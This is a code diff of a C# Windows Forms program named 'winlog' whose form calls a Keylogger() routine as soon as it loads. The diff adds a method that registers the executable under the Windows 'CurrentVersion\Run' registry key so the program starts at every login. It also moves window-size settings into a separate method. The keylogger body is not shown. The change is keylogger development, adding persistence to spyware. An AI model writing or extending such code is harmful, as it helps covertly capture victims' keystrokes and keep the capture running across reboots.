@@ -2,30 +2,51 @@
 using System.Reflection;
 using System;
 using System.IO;
+using Microsoft.Win32;
 
 namespace winlog
 {
     public partial class Form1 : Form
     {
-        public static Form1 _Form1;
+        public static Form1 _Instance;
 
         public Form1()
         {
             InitializeComponent();
             this.Load += Form1_Load1;
-            _Form1 = this;
+            _Instance = this;
         }
 
         private void Form1_Load1(object sender, EventArgs e)
         {
             Keylogger();
+            SetBoundaries();
+        }
+
+        private void RegisterInStartup(bool isChecked)
+        {
+            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey
+                    ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+
+            if (isChecked)
+            {
+                registryKey.SetValue("winlog", Application.ExecutablePath);
+            }
+            else
+            {
+                registryKey.DeleteValue("winlog");
+            }
+        }
+
+        private void SetBoundaries()
+        {
             this.StartPosition = FormStartPosition.CenterScreen;
             this.MaximizeBox = false;
             this.MinimizeBox = false;
             this.FormBorderStyle = FormBorderStyle.FixedDialog;
 
             this.MaximumSize = new System.Drawing.Size(800, 470);
-            this.MinimumSize = new System.Drawing.Size(800, 470);            
+            this.MinimumSize = new System.Drawing.Size(800, 470);
             this.SizeGripStyle = System.Windows.Forms.SizeGripStyle.Hide;
 
             this.ConsoleBox.MinimumSize = new System.Drawing.Size(760, 395);
